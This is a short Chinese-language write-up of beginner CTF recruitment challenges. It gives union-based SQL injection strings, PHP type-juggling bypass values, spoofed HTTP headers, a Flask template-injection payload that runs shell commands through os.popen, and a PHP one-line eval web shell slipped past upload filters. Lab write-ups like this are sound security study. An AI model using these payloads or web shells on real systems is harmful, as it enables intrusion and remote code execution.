#12 CTF

寒假期间偶然接触到过ctf，了解一些基础知识，虽然不准备走网安方向，但还是做了一部分简单的ctf招新题。

1.签到题：

提示中已给出

2.NothingHere:

查看源代码即可发现flag

3.Easysql:

很明显，这是一道sql注入的题，构造’1’ order by 2,和’1’ union select 1,2得到字段长度和回显位置，构造’1’union select1,database() 查到数据库名字为easysql，构造’1’union select 1,table_name from information_schema.tables where table_schema=’easysql’ 查出表名为flaghere，最后盲猜flag字段，构造’1’union select 1,flag from flaghere得到flag

4.GET&POST:

isset()函数检查变量有没有被设置，用hackbar同时以get和post方式给a和b随便提交一个值进去即可获得flag

5.SheIsAlwaysTheBEST:

0exxxxxx形式的数值会被当成科学计数法，结果都为0，“==”判定为真，所以只要找两个md5值都为oe开头的即可，因为a要求为纯字母，b要求为数字，最终输入的值为a=QNKCDZO&b=240610708。最后要解决的是变量c，首先变量c是一个对象，其中还包含了key这一变量，并且这个k的值还要满足 key == $flag。显然，flag是一条字符串，而”==”只比较数值，字符串会被当成0来处理，所以我们只要给c这个对象的key设置为0即可，即用post传入c={“key”:0}即可获得flag

6.IP&Referer:

改一下http头即可：

X-Forwarded-For:1.1.1.1

Referer:www.doyouhaveagirlfriend.com

7.EasyFLASK:

根据题目可知这是一道flask模板注入的题，根据提示需要用post给name传值，构造name={ {1+1} }提交显示2，由此可知，存在ssti漏洞，构造’’._class_\.__bases__[0].__subclasses__()查找父类的所有子类，通过浏览器搜索发现有warnings.catch_warnings这一子类，得到位置为182，

构造{ {‘’.__class__.__bases__[0].__subclasses__()[182].__init__.__globals__.__builtins__.eval(“__import__(‘os’).popen(‘dir’).read()”) } }查得放有flag的文件的文件名为flag.txt，所以在前面的基础上改为popen(‘cat flag.txt’)，得到最终的payload，并得到flag.

{ {‘’.__class__.__bases__[0]._subclasses_\()[182].__init__.__globals__.__builtins__.eval(“__import__(‘os’).popen(‘cat flag.txt’).read()”)} }

8.EasyUPLOAD:

显然，这是一道文件上传的题。上传含一句话木马的php文件，发现有文件类型检测。用burp suite抓包改文件类型为image/jpeg后成功绕过，但发现还有文件内容检测，几次上传尝试后，发现是对<?php这一敏感词有限制，修改一句话木马为<?=eval($_POST[‘cmd’]);后成功绕过检测，上传成功，用蚁剑连上后成功找到flag。
